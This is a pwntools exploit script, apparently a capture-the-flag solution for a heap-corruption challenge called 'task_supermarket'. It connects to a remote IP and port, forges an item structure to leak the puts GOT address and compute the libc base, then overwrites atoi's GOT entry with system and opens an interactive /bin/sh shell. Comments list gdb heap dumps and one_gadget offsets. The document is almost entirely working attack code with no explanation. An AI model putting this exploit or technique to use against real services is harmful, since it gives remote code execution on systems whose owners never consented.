# coding:utf-8
from pwn import *

debug=0
context.log_level='debug'
elf = ELF('./task_supermarket')
if debug:
    p=process('./task_supermarket')
#    context.log_level='debug'
#    gdb.attach(p)
    libc=ELF('/home/moonagirl/moonagirl/libc/libc_local_x32')
    one_gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
else:
    p=remote('49.4.23.67', 32366)#  
    libc = ELF('/home/moonagirl/moonagirl/libc/libc6-i386_2.23-0ubuntu9_amd64.so')
    one_gadgets = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def z(a=''):
    gdb.attach(p,a)
    if a == '':
        raw_input()

def add(name,price,sz,des):
    se('1\n')
    ru('name:')
    se(name+'\n')
    ru('price:')
    se(str(price)+'\n')
    ru('descrip_size:')
    se(str(sz)+'\n')
    ru('description:')
    se(des)
    ru('your choice>>')


def delete(name):
    se('2\n')
    ru('name:')
    se(name+'\n')
    ru('your choice>>')

def list():
    se('3\n')
    ru('all  commodities info list below:')
    data=ru('---------menu---------')
    ru('your choice>>')
    return data

def change_price(name,price):
    se('4\n')
    ru('name:')
    se(name+'\n')
    ru('input the value you want to cut or rise in:')
    se(str(price)+'\n')
    ru('your choice>> ')
   
def change_des(name,sz,des):
    se('5\n')
    ru('name:')
    se(name+'\n')
    ru('descrip_size:')
    se(str(sz)+'\n')
    ru('description:')
    se(des)
    ru('your choice>> ')

add('1',1,28,'a\n')
add('2',1,28,'b\n')

change_des('1',50,'\x00\n')
add('3',1,28,'c\n')

fake_item=p32(0x33)+p32(0)*3+p32(1)+'\xf0'

change_des('1',28,fake_item+'\n')

add('4',1,28,'d\n')


payload = p32(0x63) + p32(0)*6 + p32(0x21) + p32(0x34) + p32(0)*3 + p32(1) + p32(0x1c) + p32(elf.got['puts'])
payload = payload.ljust(0xf0,'\x00')
change_des('3',0xf0,payload+'\n')

# list()
list()
p.sendline('3')
p.recvuntil('4: price.1, des.')
data = u32(p.recv(4).ljust(4,'\x00'))
print '------------------------------------------------------------------------------'
success('puts_addr:'+hex(data))

libc_base =  data - libc.symbols['puts']
success('libc_base:'+hex(libc_base))

malloc_hook = libc_base + libc.symbols['__malloc_hook']
success('malloc_hook:'+hex(malloc_hook))

gadget = libc_base + one_gadgets[3]
success('gadget:'+hex(gadget))

payload = p32(0x63) + p32(0)*6 + p32(0x21) + p32(0x34) + p32(0)*3 + p32(1) + p32(0x1c) + p32(elf.got['atoi'])
payload = payload.ljust(0xf0,'\x00')
change_des('3',0xf0,payload+'\n')

system_addr = libc_base + libc.symbols['system']
success('system_addr:'+hex(system_addr))
change_des('4',0x1c,p32(system_addr).ljust(0x1c,'\x00'))

p.sendline('\n')
p.sendline('/bin/sh\x00')
#z()
# # #z()
p.interactive()
# gef➤  x/20w 0x8f54028                           --> 3
# 0x8f54028:  0x33    0x0 0x0 0x0
# 0x8f54038:  0x1 0xf0    0x8f540c0   0x21

# gef➤  x/20w 0x8f540e0                           --> 4
# 0x8f540e0:  0x34    0x0 0x0 0x0
# 0x8f540f0:  0x1 0x1c    0x8f54100   0x21

# gef➤  x/20w 0x8f540c0
# 0x8f540c0:  0x63    0x0 0x0 0x0
# 0x8f540d0:  0x0 0x0 0x0 0x21
# 0x8f540e0:  0x34    0x0 0x0 0x0
# 0x8f540f0:  0x1 0x1c    0x8f54100   0x21
# 0x8f54100:  0x64    0x0 0x0 0x0

# 0x3ac5c execve("/bin/sh", esp+0x28, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x28] == NULL

# 0x3ac5e execve("/bin/sh", esp+0x2c, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x2c] == NULL

# 0x3ac62 execve("/bin/sh", esp+0x30, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x30] == NULL

# 0x3ac69 execve("/bin/sh", esp+0x34, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x34] == NULL

# 0x5fbc5 execl("/bin/sh", eax)
# constraints:
#   esi is the GOT address of libc
#   eax == NULL

# 0x5fbc6 execl("/bin/sh", [esp])
# constraints:
#   esi is the GOT address of libc
#   [esp] == NULL

# 0x3a80c execve("/bin/sh", esp+0x28, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x28] == NULL

# 0x3a80e execve("/bin/sh", esp+0x2c, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x2c] == NULL

# 0x3a812 execve("/bin/sh", esp+0x30, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x30] == NULL

# 0x3a819 execve("/bin/sh", esp+0x34, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x34] == NULL

# 0x5f065 execl("/bin/sh", eax)
# constraints:
#   esi is the GOT address of libc
#   eax == NULL

# 0x5f066 execl("/bin/sh", [esp])
# constraints:
#   esi is the GOT address of lib